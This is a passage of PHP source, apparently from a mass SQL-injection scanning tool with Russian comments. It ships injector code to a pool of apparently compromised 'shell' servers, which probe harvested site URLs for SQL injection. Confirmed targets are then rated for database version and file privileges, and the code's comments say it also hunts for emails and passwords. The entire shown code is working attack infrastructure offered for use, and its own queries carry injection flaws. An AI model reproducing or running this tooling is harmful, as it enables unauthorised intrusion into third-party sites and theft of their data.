								{
									
									//$ch = $this->create_streem($urs_shell,$urlllll,$this->time_crowler);	
									//$tasks[$urlllll.':::'.$urs_one['domens']['id']] = $ch;
									
									
									$ch = $this->create_streem($urs_shell,$urlllll,$this->time_crowler);	
									$tasks[$urlllll.':::'.$urs_one['domens']['id']] = $ch;
									//$this->d($tasks,'dopolnitelno');
									
								}
							}
						}
					}	
					curl_multi_add_handle($cmh, $ch);
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		curl_multi_close($cmh);

		
		
		$this->stop();
		
		die('end errorDOMENS');

	}	
		
	function check_posts_all_to_post($id=''){ // Перекидывает из таблицы posts_all в POSTS для анализа  и помечает если одна успешная другие не будет чекать
		
		
		if($id !=''){
			$file = $this->Post->query("SELECT * FROM `posts_all` WHERE `id`=$id limit 1");
			
			
			$this->d("SELECT * FROM `posts_all` WHERE `id`=$id limit 1");
			
		}else{
			
			$file = $this->Post->query("SELECT * FROM `posts_all` WHERE `status` =3 AND `insert_post` =0 limit 10");
		}
		//$this->timeStart = $this->start('check_posts',1);
		
		
		
		
		
		$this->d($file,'$file check_posts_all_to_post id '.$id);
		//exit;
		
		foreach ($file as $val)
		{
			

		$id = $val['posts_all']['id'];	
			
		$url = $val['posts_all']['url'];
		
		$gurl = $val['posts_all']['gurl'];
		
		$sposob = $val['posts_all']['sposob'];

		$domen = $val['posts_all']['domen'];

		$path_query = $val['posts_all']['path_query'];

		$http = $val['posts_all']['http'];

		$sleep = $val['posts_all']['sleep'];

		$find = $val['posts_all']['find'];

		$status = $val['posts_all']['status'];
			
		$tables = $val['posts_all']['tables'];

		$work = $val['posts_all']['work'];
		
		$prohod = $val['posts_all']['prohod'];

		$method = $val['posts_all']['method'];
		
		$column = $val['posts_all']['column'];

		$mysqlbd = $val['posts_all']['mysqlbd'];

		$file_priv = $val['posts_all']['file_priv'];
		
		$from = $val['posts_all']['from'];


		$version = $val['posts_all']['version'];
		
		$tic = $val['posts_all']['tic'];

		
			
			$date= date('Y-m-d h:i:s');
			$tic = 0;
			$maska = $this->get_arg_url($url);
			$crawler=1;
			
				
			
			
			
			if($this->Post->query("INSERT INTO `posts` (`domen`,`url`,`gurl`,`http`,`path_query`,`find`,`status`,`maska`,`crawler`,`date`,`tic`,`tables`,`prohod`,`method`,`column`,`mysqlbd`,`file_priv`,`version`,`work`,`sposob`,`from` ) VALUES('{$domen}','{$url}','{$gurl}','{$http}','{$path_query}','{$find}',{$status},'{$maska}',1,'{$date}','{$tic}','{$tables}','{$prohod}','{$method}','{$column}','{$mysqlbd}','{$file_priv}','{$version}','{$work}',{$sposob},'{$from}'  )"))
			{
					$this->d('insert good iz posts_all v posts check_posts_all_to_post');
					$this->d("UPDATE  `posts_all`  set `insert_post` = 1 WHERE `domen` like '%$domen%' or `url` like '%$domen%");
					
					$this->Post->query("UPDATE  `posts_all`  set `insert_post` = 1 WHERE `domen` like '%$domen%' or `url` like '%$domen%'");
					
					//$this->Post->query("UPDATE  `posts_all`  set `insert_post` = 1 WHERE `domen` like '%$domen%' or `url` like '%$domen%'");
					
			}else
			{
				
				$this->d("INSERT INTO `posts` (`domen`,`url`,`gurl`,`http`,`path_query`,`find`,`status`,`maska`,`crawler`,`date`,`tic`,`tables`,`prohod`,`method`,`column`,`mysqlbd`,`file_priv`,`version`,`work`,`sposob`,`from` ) VALUES('{$domen}','{$url}','{$gurl}','{$http}','{$path_query}','{$find}',{$status},'{$maska}',1,'{$date}','{$tic}','{$tables}','{$prohod}','{$method}','{$column}','{$mysqlbd}','{$file_priv}','{$version}','{$work}',{$sposob},'{$from}')");
				echo '<br>';
				$this->d('vozmojno uje est v bd');
				$this->d('BAD !!! !!!!!!!!!!!! iz posts_all v posts check_posts_all_to_post');
				
				//if($this->Post->query("UPDATE  `posts_all`  set `insert_posts` = 1 WHERE `id`=$id"))
				//{
					//$this->d($domen_old,'update posts duble');
					//$this->Post->query("UPDATE  `domens`  set `insert_post` = 1 WHERE `id`=$id ");
				//}
				
			}
				flush();
		
		}	
			
	}
	
	
	

	//////ФУНКЦИИ КОТОРЫЕ ОТВЕЧАЮТ ЗА ПОИСК SQLI,ПРОВЕРКУ ШЕЛОВ,ПОИСК МЫЛ И ПАРОЛЕЙ///////
	
	function black_site($site){
		
		
		$fp = fopen('black_site.txt', 'x');
		$black =  file('black_site.txt');
		
		foreach($black as $bl)
		{
				$bl = str_replace('http://','',$bl);
				$bl = str_replace('www.','',$bl);
				$bl = trim($bl);
				
				if(strlen($bl)>3){
				
					if($this->Post->query("DELETE FROM posts WHERE domen like '%$bl%'")){
						
						//$this->d("DELETE FROM posts WHERE domen like '%$bl%'");
					}
				}
			
				
		}
	
		
	
	}

	
	
	
	
	function errorFinder($test=''){//поиск sqli по ошибкам, выводимым ++MSSQL++ and --MYSQL--   НАЧИТАЕТ СО STATUS 0 НЕ ЧЕКНУТЫЕ И СТАВИТ STATUS 1 ЕСЛИ ХУЕВО FALSE
		
        

		
		$this->black_site();
		
		$file = $this->Post->query("SELECT count(*) FROM `posts` WHERE `status`=0  AND header='get'");
		
		
		
		
		$start = $this->Post->query('SELECT * FROM  `starts` WHERE function="psn" ');	

		if(count($start) > 0)
		{
			die('Уже запущено PSN');
		}
		

        
        //$this->d($file,'file');
        
        if($this->stop_shag1=='' or !isset($this->stop_shag1)){
            
            $this->stop_shag1=500;
        }
        
        
		if(intval($file[0][0]['count(*)'])!==0)
		{		
			$this->timeStart = $this->start('stepOne',1);
		}else
		{
			die('TimeStart');
		}
               

        $urls_multi = $this->Post->query("SELECT count(*) FROM `posts` WHERE `status`=2 AND `prohod`<5 AND (find !='cookies' AND find !='referer'  AND find !='useragent'  and find !='forwarder')");

        if(intval($urls_multi[0][0]['count(*)'])>$this->stop_shag1)
		{		
            $this->stop();
			die('TimeStartMULTI > 500');
            
		}
        
        
       // $this->d($urls_multi,'$urls_multi');
        
       // exit;
		
		
		$this->Post->query("DELETE FROM `posts` WHERE `domen` like 'www.%'");
		
		$r = rand(1,100);
		//$this->logs("stepOne zapushen - № $r".intval($file[0][0]['count']),__FUNCTION__);
		
		
		//$this->Post->query("UPDATE  `posts`  set `url` =  REPLACE(url,'http://http://','http://')");
		
		
		
		$file100 = $this->Post->query("SELECT `domen`,`url`,`id` FROM `posts` WHERE `status`=0 limit 50");
		
		$this->proxyCheck();
		
		foreach ($file100 as $val100)
		{
			//$this->d($val100,'100');
		
			$domen = $val100['posts']['domen'];
			
			
			//удалит всякую шлюпу,но в  том числе и сайты на ip
			if(!preg_match("//^[^-\._][a-z\d_\.-]+\.[a-z]{2,6}$//i", $domen,$match))
			{
				$id = $val100['posts']['id'];
				//$this->d($domen,'domen');
				//$file = $this->Post->query("DELETE FROM `posts` WHERE `id`=".$id);
			}
		}
		
		
		//die('TimeStart');
		//exit;
		
		//$file = $this->Post->query("SELECT `url`,`id` FROM `posts` WHERE `status`=0 limit 500");
		
		if($this->sqlmap_check==true)
		{
				$file = $this->Post->query("SELECT `url`,`id`,`http`,`header` FROM `posts` WHERE `status`=0 AND `sqlmap_check`=0  limit ".$this->error_limit);
			
		}else{
				$file = $this->Post->query("SELECT `url`,`id`,`http`,`header` FROM `posts` WHERE `status`=0 limit ".$this->error_limit);
		}
	
        $this->d($file,'file');
		
		
		$this->evaltest();
		
		foreach ($file as $val)
		{
            $val['posts']['http'] = trim($val['posts']['http']);
            
			$urls[] = $val['posts']['url'].'++'.$val['posts']['http'].'++'.$val['posts']['header'].'++'.$val['posts']['id'];
		}
		/**
		//$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		//$injectorfile = file_get_contents($filename);
		//$code = str_replace('URLURL', 'URLURL', file_get_contents('sql.php'))
		//$this->code = str_replace(array('<?php','?>'), '', $injectorfile.$code);
		//include($_SERVER['DOCUMENT_ROOT'].'/config.php');
		**/
	
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', 'URLURL', file_get_contents('sql.php'));
		$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
		$conf = str_replace(array('<?php','?>'), '', $conf);
		$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
		
		
		
		$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
		
		//$this->d($this->code,'$this->code');
		//exit;
		
		$cmh = curl_multi_init();

		$tasks = array();
		
		$count_serv = count($this->serv);
		$count_urls = count($urls);
		$i=0;

		$this->d($count_serv,'count_serv_kolichetvo!!');
		
		$this->d($count_urls,'$count_urls');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			echo $i.' - i<br>';
			
			if($i==$count_serv or count($urls) == 0)
			{
				$this->d($i,'count->break'); 
				break;
			}
			
			
			$urserv = $this->serv[$i];	
			if($urserv =='')break;	
			
			
			//multi
			//$ch = $this->create_streem($urs_shell,$urlllll.'::'.$urs_one['posts']['http'],150);	
			//$tasks[$urs_one['posts']['url'].':::'.$urs_one['posts']['id']] = $ch;
			
			
			$ch = $this->create_streem($urserv,array_shift($urls),$this->error_time);
			$this->d($ch);
			$tasks[$urserv] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$this->d($ch,'ch');

						$url = array_search($ch, $tasks);

						$tasks[$url] = curl_multi_getcontent($ch);
						$cont = explode(':::', $tasks[$url]);
						$cont[1] = trim($cont[1]);
						$id_new = trim($cont[2]);
						$id_new = str_replace('askldjl2913912ksdal','',$id_new);
                        $id_new = trim($id_new);
                        
                        
                        
						if($this->debug===true){$this->d($tasks[$url],"$url");}
						
						
						
						
						
						if(strstr($tasks[$url],'Internal Server') or strstr($tasks[$url],'405 Not Allowed')  or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage') or strstr($tasks[$url],'Malformed header from CGI script')  or strstr($tasks[$url],'Server Error')  or strstr($tasks[$url],'Access is denied') or strstr($tasks[$url],'HTTP Error') or strstr($tasks[$url],'not have permission'))
						{	
				
								$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/blackshell.txt";	
								$fh = fopen($filename, "a+");
								$this->d('Internal Server Error');
								if(trim($url) !='')fwrite($fh, trim($url)."\r\n");
								fclose();	
								
						}
											
						
						
						
						$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
						$cont[0] = str_replace('http://	http://','http://',trim($cont[0]));
						$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
						$cont[0] = str_replace('http://http:// ','http://',trim($cont[0]));
						$cont[0] = str_replace('http://','',trim($cont[0]));
						$cont[0] = str_replace('https://','',trim($cont[0]));
						
						
						$kk = $cont[0];
						$kk = 'http://'.$kk;
						$tmp = parse_url($kk);
						
                        
                        
                        
                        
						$domen = mysql_real_escape_string ($tmp['host']);
						$domen = str_replace('www.www.www.','',$domen);
						$domen = str_replace('www.www.','',$domen);
						$domen = str_replace('www.','',$domen);
						$tt = str_replace('www.','',$domen);
						$domen2 = 'www.'.$tt;
						
						 
						
						
						$date = date('Y-m-d h:i:s');
						
						
						
						
						if(!strstr($cont[1],'false') AND trim($cont[1])!=='' AND trim($cont[0])!=='')
						{
							
							
							
							//$id = $this->Post->query("SELECT `id` FROM `posts` WHERE `domen` = '".$domen."' or `domen` = '".$domen2."'");
							$id = $this->Post->query("SELECT `id` FROM `posts` WHERE `id` = ".$id_new);
							
							
							
							
							
							
							if(count($id)==1)
							{
								if(!strstr($cont[1], '%'))
								{
									$this->d($cont[0],'url found SQLI OK!!!!');
									
									
									
								$this->Post->query("UPDATE `posts` SET `find`='".$cont[1]."',`status`=2,`date`='".$date."',`tic`='".$this->getcy('http://'.$tmp['host'])."' WHERE `id`=".$id[0]['posts']['id']);
                                
                                $this->d("UPDATE `posts` SET `find`='".$cont[1]."',`status`=2,`date`='".$date."',`tic`='".$this->getcy('http://'.$tmp['host'])."' WHERE `id`=".$id[0]['posts']['id']);
								}
								
							}else
							{
								
								$this->d("SELECT `id` FROM posts WHERE `id` = ".$id_new);
								
								$this->d($cont[0],'SQLI OK! id  NOT found!!  '. $cont[1]);
							}
							
						}
						
						
						if(strstr($cont[1],'false') AND trim($cont[0])!=='')
						{
							
							
							//$id = $this->Post->query("SELECT `id` FROM `posts` WHERE  `domen` = '".$domen."' or `domen` = '".$domen2."'");
							$id = $this->Post->query("SELECT `id` FROM `posts` WHERE `id` = ".$id_new);
                            
                            //$this->d($id,'$id');
                            
						    $id[0]['posts']['id'] = trim($id[0]['posts']['id']);
							
							if(count($id)==1)
							{
								if($this->Post->query("UPDATE `posts` SET `status`=1,`date`='".$date."' WHERE `id`=".$id[0]['posts']['id'])){
									
                                    $this->d("UPDATE `posts` SET `status`=1,`date`='".$date."' WHERE `id`=".$id[0]['posts']['id']);
									//$this->d('FALSE UPDATE TRUE');
								}
							}else
							{
								$this->d('count[1] = false AND $cont[0] !=""');
								//$this->d("SELECT `id` FROM `posts` WHERE  `domen` = '".$domen."' or `domen` = '".$domen2."'");
									$this->d("SELECT `id` FROM posts WHERE `id` = ".$id_new);
								$this->d($cont[0],'HUEVO  FALSE id NOT found!!');
							}
							
						}

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						if(count($urls)>0)
						{
							echo 'zapusk dopolnitelno<br>';	
							
							$kkk = count($this->serv);
							$lll = mt_rand(1,$kkk);
							$urserv = $this->serv[$lll];
							
							$ch = $this->create_streem($urserv,array_shift($urls),$this->error_time);			
							$tasks[$urserv] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		curl_multi_close($cmh);

		$file = $this->Post->query("SELECT `id` FROM `posts` WHERE `status`=0");	

		if(count($file)<10)
		{	
			//$this->errorFinder();
			//$this->Post->query("DELETE FROM `posts` WHERE `status` =0");	
		}
		
		$this->stop();
		
		die('end errorfind');

	}	

	function errorFinder_all($test=''){//поиск sqli по ошибкам, выводимым ++MSSQL++ and --MYSQL-- модуль сделанн для того чтоб 
		
		
		$this->black_site();
		
		$file = $this->Post->query("SELECT count(*) as count FROM `posts_all` WHERE `status`=0");
		
		//$file = $this->Post->query("SELECT count(*) as count FROM `posts_all` WHERE `status`=0");
		
		
		$this->d();
		
		$start = $this->Post->query('SELECT * FROM  `starts` WHERE function="psn" ');	

		if(count($start) > 0)
		{
			die('Уже запущено PSN');
		}
		

		if(intval($file[0][0]['count'])!==0)
		{		
			$this->timeStart = $this->start('stepOne_all',1);
		}else
		{
			die('TimeStart');
		}		
		
		$this->Post->query("DELETE FROM `posts_all` WHERE `domen` like 'www.%'");
		
		$r = rand(1,100);
		//$this->logs("stepOne zapushen - № $r".intval($file[0][0]['count']),__FUNCTION__);
		
		
		$this->Post->query("UPDATE  `posts_all`  set `url` =  REPLACE(url,'http://http://','http://')");
		
		
		
		$file100 = $this->Post->query("SELECT `domen`,`url`,`id` FROM `posts_all` WHERE `status`=0 limit 50");
		
		$this->proxyCheck();
		
		foreach ($file100 as $val100)
		{
			//$this->d($val100,'100');
		
			$domen = $val100['posts_all']['domen'];
			
			
			//удалит всякую шлюпу,но в  том числе и сайты на ip
			if(!preg_match("//^[^-\._][a-z\d_\.-]+\.[a-z]{2,6}$//i", $domen,$match))
			{
				$id = $val100['posts_all']['id'];
				//$this->d($domen,'domen');
				//$file = $this->Post->query("DELETE FROM `posts_all` WHERE `id`=".$id);
			}
		}
		
		
		//die('TimeStart');
		//exit;
		
		//$file = $this->Post->query("SELECT `url`,`id` FROM `posts_all` WHERE `status`=0 limit 500");
		
		if($this->sqlmap_check==true)
		{
				$file = $this->Post->query("SELECT `url`,`id`,`http`,`header` FROM `posts_all` WHERE `status`=0 AND `sqlmap_check`=0  GROUP by `domen` limit ".$this->error_limit_all);
			
		}else{
				$file = $this->Post->query("SELECT `url`,`id`,`http`,`header` FROM `posts_all` WHERE `status`=0  GROUP by `domen` limit ".$this->error_limit_all);
		}
		
		
		if(count($file)<5){
			$file = $this->Post->query("SELECT `url`,`id`,`http`,`header` FROM `posts_all` WHERE `status`=0  limit ".$this->error_limit_all);
			
		}
	
		//$this->d($file,'file');
		
		//exit;
		$this->evaltest();
		
		foreach ($file as $val)
		{
			$urls[] = $val['posts_all']['url'].'++'.$val['posts_all']['http'].'++'.$val['posts_all']['header'].'++'.$val['posts_all']['id'];
		}
		/**
		//$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		//$injectorfile = file_get_contents($filename);
		//$code = str_replace('URLURL', 'URLURL', file_get_contents('sql.php'))
		//$this->code = str_replace(array('<?php','?>'), '', $injectorfile.$code);
		//include($_SERVER['DOCUMENT_ROOT'].'/config.php');
		**/
	
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', 'URLURL', file_get_contents('sql.php'));
		$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
		$conf = str_replace(array('<?php','?>'), '', $conf);
		$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
		
		
		
		$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
		
		//$this->d($this->code,'$this->code');
		//exit;
		
		$cmh = curl_multi_init();

		$tasks = array();
		
		$count_serv = count($this->serv);
		$count_urls = count($urls);
		$i=0;

		$this->d($count_serv,'count_serv_kolichetvo!!');
		
		$this->d($count_urls,'$count_urls');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			echo $i.' - i<br>';
			
			if($i==$count_serv or count($urls) == 0)
			{
				$this->d($i,'count->break'); 
				break;
			}
			
			
			$urserv = $this->serv[$i];	
			if($urserv =='')break;	
			
			
			//multi
			//$ch = $this->create_streem($urs_shell,$urlllll.'::'.$urs_one['posts_all']['http'],150);	
			//$tasks[$urs_one['posts_all']['url'].':::'.$urs_one['posts_all']['id']] = $ch;
			
			
			$url = array_shift($urls);
			
			$ch = $this->create_streem($urserv,$url,$this->error_time);
			$tasks[$urserv] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
			$this->d($ch);
			
		}
		
		
		
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$this->d($ch,'ch');

						$url = array_search($ch, $tasks);

						$tasks[$url] = curl_multi_getcontent($ch);
						$cont = explode(':::', $tasks[$url]);
						$cont[1] = trim($cont[1]);
						$id_new =  trim($cont[2]);
                        $id_new = str_replace('askldjl2913912ksdal','',$id_new);
                        $id_new = trim($id_new);
						
                        
                        
						if($this->debug==true){$this->d($tasks[$url],"$url");}
						//exit;
						
						
						
						
						
						if(strstr($tasks[$url],'Internal Server') or strstr($tasks[$url],'405 Not Allowed')  or strstr($tasks[$url],'TURKHACKTEAM') or strstr($tasks[$url],'Während der Anfrage') or strstr($tasks[$url],'Malformed header from CGI script') or strstr($tasks[$url],'HTTP Error') or strstr($tasks[$url],'not have permission') )
						{	
				
								$filename = $_SERVER['DOCUMENT_ROOT']."/app/webroot/blackshell.txt";	
								$fh = fopen($filename, "a+");
								$this->d('Internal Server Error');
								if(trim($url) !='')fwrite($fh, trim($url)."\r\n");
								fclose();	
								
						}
											
						
						
						
						$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
						$cont[0] = str_replace('http://	http://','http://',trim($cont[0]));
						$cont[0] = str_replace('http://http://','http://',trim($cont[0]));
						$cont[0] = str_replace('http://http:// ','http://',trim($cont[0]));
						$cont[0] = str_replace('http://','',trim($cont[0]));
						$cont[0] = str_replace('https://','',trim($cont[0]));
						
						
						$kk = $cont[0];
						$kk = 'http://'.$kk;
						$tmp = parse_url($kk);
						
						$domen = mysql_real_escape_string ($tmp['host']);
						$domen = str_replace('www.www.www.','',$domen);
						$domen = str_replace('www.www.','',$domen);
						$domen = str_replace('www.','',$domen);
						$tt = str_replace('www.','',$domen);
						$domen2 = 'www.'.$tt;
						
						
						
						
						$date = date('Y-m-d h:i:s');
						
						
						
						
						if(!strstr($cont[1],'false') AND trim($cont[1])!=='' AND trim($cont[0])!=='')
						{
							
							$id = $this->Post->query("SELECT `id` FROM `posts_all` WHERE `id` =".$id_new);
							
							//$id = $this->Post->query("SELECT `id` FROM `posts_all` WHERE `domen` = '".$domen."' or `domen` = '".$domen2."'");
							
							
							
							
							
							
							if(count($id)==1)
							{
								if(!strstr($cont[1], '%'))
								{
									$this->d($cont[0],'url found SQLI OK!!!!');
									
									
									
								$this->Post->query("UPDATE `posts_all` SET `find`='".$cont[1]."',`status`=2,`date`='".$date."',`tic`='".$this->getcy('http://'.$tmp['host'])."' WHERE `id`=".$id[0]['posts_all']['id']);
								}
								
							}else
							{
								
								$this->d("SELECT `id` FROM `posts_all` WHERE `id` =".$id_new);
								//$this->d("SELECT `id` FROM posts_all WHERE `domen` = '".$domen."' or `domen` = '".$domen2."'");
								$this->d($cont[0],'SQLI OK!(OTVET GOOD OT SERVERA) NO  id  NOT found!!  '. $cont[1]);
							}
							
						}
						
						
						if(strstr($cont[1],'false') AND trim($cont[0])!=='')
						{
							
							
							//$id = $this->Post->query("SELECT `id` FROM `posts_all` WHERE  `domen` = '".$domen."' or `domen` = '".$domen2."'");
							$id = $this->Post->query("SELECT `id` FROM `posts_all` WHERE `id` =".$id_new);
						
							
							if(count($id)==1)
							{
								if($this->Post->query("UPDATE `posts_all` SET `status`=1,`date`='".$date."' WHERE `id` =".$id[0]['posts_all']['id'])){
									
									$this->d('FALSE UPDATE TRUE');
								}
							}else
							{
								$this->d('count[1] = false AND $cont[0] !=""');
								$this->d("SELECT `id` FROM `posts_all` WHERE `id` =".$id_new);
								//$this->d("SELECT `id` FROM `posts_all` WHERE  `domen` = '".$domen."' or `domen` = '".$domen2."'");
								$this->d($cont[0],'HUEVO  FALSE OTVET OT SHELLA AND  id NOT found!!');
							}
							
						}

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						if(count($urls)>0)
						{
							echo 'zapusk dopolnitelno<br>';	
							
							$kkk = count($this->serv);
							$lll = mt_rand(1,$kkk);
							$urserv = $this->serv[$lll];
							
							$ch = $this->create_streem($urserv,array_shift($urls),$this->error_time);			
							$tasks[$urserv] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		curl_multi_close($cmh);

		$file = $this->Post->query("SELECT `id` FROM `posts_all` WHERE `status`=0");	

		if(count($file)<10)
		{	
			//$this->errorFinder();
			//$this->Post->query("DELETE FROM `posts_all` WHERE `status` =0");	
		}
		
		$this->stop();
		
		die('end errorfind');

	}	

	
	function multi($test=''){// проверка на sqli инъекцию(подключение,версия, привелегии) ++MSSQL++ and --MYSQL--
		
		$this->multi_duble_check2();
        
        if($this->multi_count ==''){
            
            $this->multi_count=3;
        }
        
               

        
		uses('xml');

		
		//если есть пустые и не проверенные, то прекращаем
		$file = $this->Post->query("SELECT count(*) FROM `posts` WHERE `status`=0");
		
		
		if(intval($file[0][0]['count(*)']) > 200)
		{
			
			//$this->logs('stepTwo STOP - stepOne vipolnyetsya: '.intval($file[0][0]['count']),__FUNCTION__);
			//die('stepTwo STOP - stepOne vipolnyetsya: '.intval($file[0][0]['count(*)']));	
		}
		$r = rand(1,100);
		
		
			$this->Post->query("UPDATE  `posts`  set `url` =  REPLACE(url,'\"','')");
		
		
		$this->timeStart = $this->start('stepTwo',1);
		
        //$urls = $this->Post->query("SELECT count(*) as `count` FROM `posts` WHERE `status`=2 AND `prohod`<5");
        
		$urls = $this->Post->query("SELECT * FROM `posts` WHERE `status`=2 AND `prohod`<5 AND `multi_count` < ".$this->multi_count." AND (find !='cookies' AND find !='referer'  AND find !='useragent'  and find !='forwarder') limit ".$this->multi_limit);
		
		$this->d($urls,'$urls');
		//exit;
		if(count($urls)==0)
		{
			
			$this->stop();
			
            
         
            
			echo 'Нету ссылок';
			die();
		}
		
		
		
		$this->proxyCheck();

		$this->evaltest();

		echo '<h1>Загрузили шеллы</h1>';
		flush();
		$serv  = $this->serv;
		
		
		
			
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php',$_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', 'URLURL', file_get_contents('code.php'));
		$conf = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/config.php');
		$conf = str_replace(array('<?php','?>'), '', $conf);
		$injconf = str_replace('include($_SERVER["DOCUMENT_ROOT"]."/config.php");', $conf , $injectorfile);
		$this->code = str_replace(array('<?php','?>'), '', $injconf.$code);
		
		
		
		
		
		
		
		
		$cmh = curl_multi_init();

		
		$tasks = array();

		$count_serv = count($serv);
		$count_urls = count($urls);
		$i=0;

		
		
		$this->d($count_serv,'count_serv_kolichetvo!!');
		
		$this->d($count_urls,'$count_urls');
		
		$newservv = $serv;

		for($i=0;$i<$count_urls;$i++)
		{
			
			
			
			$this->workup();
			
			if($i==$count_serv or count($urls) == 0)
			{
				$this->d($i,'count->break'); 
				break;
			}
			
			flush();
			
			//$urs_shell = array_shift($newservv);
			
			$kkk = count($newservv);
			$lll = mt_rand(1,$kkk);
			$urserv = $newservv[$lll];
			$urs_shell = $urserv;
			
			
			$urs_one = array_shift($urls);
			
			$urs_shell = trim($urs_shell);
			
			
			//$this->d($urs_shell,'$urs_shell');
			//$this->d($urs_one,'$urs_one');
			
			if(!empty($urs_shell))
			{
				
				$urlllll = trim($urs_one['posts']['url']); 
				
			
				//$urls[] = $val['posts']['url'].'++'.$val['posts']['http'].'++'.$val['posts']['header'];
				
				//exit;
				$urs_one['posts']['http'] = trim($urs_one['posts']['http']);
				$ch = $this->create_streem($urs_shell,$urlllll.'::'.$urs_one['posts']['http'].'::'.$urs_one['posts']['header'],$this->multi_time);	
				$tasks[$urs_shell.':::'.$urs_one['posts']['url'].':::'.$urs_one['posts']['id']] = $ch;
				
				//$tasks[$urs_one['posts']['url'].':::'.$urs_one['posts']['id']] = $ch;
				
				curl_multi_add_handle($cmh, $ch);
			}
		}
		
		
		$this->d($tasks,'$tasks');
		//exit;
		
		$active = null;

		
		do 
		{
			
			$mrc = curl_multi_exec($cmh, $active);
		}

		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{
			
			if (curl_multi_select($cmh) != -1) 
			{
				
				do 
				{
					
					$this->workup();
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						
						
						
						
						$ch = $info['handle'];

						$url = array_search($ch, $tasks);

						$tasks[$url] = curl_multi_getcontent($ch);
						

						
						
						
						$content = $tasks[$url];
						
						//$url = explode(':::', $url);
						//$url['posts']['id'] =  $url[1];
						//$url['posts']['url'] = $url[0];
						
						if($this->debug==true){$this->d($content,'$content');}
                        
                        if($this->debug==true){$this->d($url,'$url$url$url$url');}
						
						//$url2 = $url[0];
						
						
						$url = explode(':::', $url);
                        
                        
						$shell_url =  $url[0];
						
						$url['posts']['id'] =  $url[2];
						$url['posts']['url'] = $url[1];
						
                        
						$id_new = $url[2];
						
                        $id_new = str_replace(':','',$id_new);
                        
                        //$id_new = str_replace('askldjl2913912ksdal','',$id_new);
                        //$id_new = trim($id_new);
						$url2 = $url[1];
						
						
					
						//exit;
						
						////////////////////////////////////	
						$url['posts']['url'] = str_replace('http://http://','http://',trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://	http://','http://',trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://http://','http://',trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://http:// ','http://',trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://','',trim($url['posts']['url']));
						$url['posts']['url'] = str_replace('http://','',$url['posts']['url']);
						$url['posts']['url'] = str_replace('https://','',$url['posts']['url']);
					
						
						$urltic = parse_url('http://'.$url['posts']['url']);
						$domen = $urltic['host'];
						
						$domen = str_replace('www.www.www.','',$domen);
						$domen = str_replace('www.www.','',$domen);
						$domen = str_replace('www.','',$domen);
						
						$domen2 = 'www.'.$domen;
						
						$date = date('Y-m-d h:i:s');
						
						flush();

						if(strstr($content,'falze'))
						{
							//$this->d($url['posts']['url'].":::FALZE");
							$exp = explode('::', $content);
							$ggg = 'FALZE';
							
						}else
						{
							
							
							//$this->d($url['posts']['url'].":::OK!!");
							preg_match_all("~<(.*?)>(.*?)<\/(.*?)>~",$content,$arr);
							
							
							
							
							if(isset($arr[2][1]))
							{	
                                //$this->d($arr,'arr_all');
                        
								$file_priv = 0;
								$mysqlbd = 0;
								
								if(@$arr[2][7]=='Y' or @$arr[2][7]=='y')
								{
									
									$mysqlbd = 1;
								 	$file_priv = 1;
